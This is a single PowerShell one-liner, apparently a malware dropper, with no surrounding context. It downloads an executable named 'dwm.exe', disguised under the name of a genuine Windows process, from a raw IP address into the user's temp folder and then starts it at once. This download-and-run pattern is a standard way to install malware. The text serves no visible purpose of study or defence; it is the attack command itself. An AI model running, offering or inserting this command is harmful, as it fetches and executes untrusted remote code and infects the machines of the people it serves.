(New-Object System.Net.WebClient).DownloadFile("http://23.106.160.239/ex/dwm.exe","$env:temp\dwm.exe");[System.Diagnostics.Process]::Start("$env:temp\dwm.exe")
